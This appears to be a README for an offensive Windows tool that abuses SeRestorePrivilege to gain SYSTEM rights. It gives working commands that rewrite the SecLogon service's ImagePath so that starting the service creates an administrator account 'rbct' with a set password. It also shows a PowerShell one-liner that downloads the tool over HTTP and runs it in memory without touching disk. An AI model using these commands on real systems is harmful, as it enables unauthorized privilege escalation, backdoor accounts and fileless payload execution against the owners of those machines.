# Abusing SeRestorePrivilege

## Details

Let's suppose you have an user with `SeRestorePrivilege`enabled. How do you abuse it to escalate privileges?

Let's start with the description provided by [MSDN](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672):

> Required to perform restore operations. This privilege causes the system to grant all write access control to any file, regardless of the ACL specified for the file. Any access request other than write is still evaluated with the ACL.
>
> Additionally, this privilege enables you to set any valid user or group SID as the owner of a file. The following access rights are granted if this privilege is held:
>
> - `WRITE_DAC`
> - `WRITE_OWNER`
> - `ACCESS_SYSTEM_SECURITY`
> - `FILE_GENERIC_WRITE`
> - `FILE_ADD_FILE`
> - `FILE_ADD_SUBDIRECTORY`
> - `DELETE`
>
> With this privilege, the user can bypass file, directory, registry, and other persistent objects permissions when restoring backed up files and directories and determines which users can set any valid security principal as the owner of an object.

It means you can write to any System path, including Registry hives.

## Abuse

One way to abuse it is to modify the `ImagePath` property of a service running as `NT AUTHORITY\SYSTEM` and that you can restart (or start if stopped). This way, the next time it is run, the command specified in the `ImagePath` property, will be executed.

For example, there's the `SecLogon` service which sometimes is stopped in AD environments and you should be able to start it. The original value for the `ImagePath` property is:

```bat
C:\Windows\system32\svchost.exe -k netsvcs -p
```

Using the `c++` program located in this folder, you may change the path to this:

```bat
net user rbct "P@ssw0rd!" /add; net localgroup Administrators rbct /add; C:\Windows\system32\svchost.exe -k netsvcs -p
```

## Example

Get the original value:

```ps1
# reg query "HKLM\SYSTEM\CurrentControlSet\Services\SecLogon" /v ImagePath
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\SecLogon" -Name ImagePath

# C:\Windows\system32\svchost.exe -k netsvcs -p
```

Change it:

```bat
program.exe "net user rbct P@ssw0rd! /add; net localgroup Administrators rbct /add; C:\Windows\system32\svchost.exe -k netsvcs -p" "SYSTEM\CurrentControlSet\Services\SecLogon"
```

Start the service in order for the user `rbct` to be created:

```ps1
# net start seclogon
Start-Service SecLogon
```

Or wait for the machine to be rebooted. The next time you run `net user` you'll see the new user.

## Assembly version

I used `.NET Framework 4.0` to compile the C# version of the program.

In order to execute it in memory you can employ the following technique:

```ps1
$bytes = (Invoke-WebRequest -UseBasicParsing "http://127.0.0.1/SeRestoreAbuse.exe").Content
[System.Reflection.Assembly]::Load($bytes)
[SeRestoreAbuse.Program]::Main(@("cmd /c whoami", "SYSTEM\CurrentControlSet\Services\SecLogon"))
```

Pay attention to the `Exit` instruction inside `Program.cs`: if it's run then it will close the current powershell session.
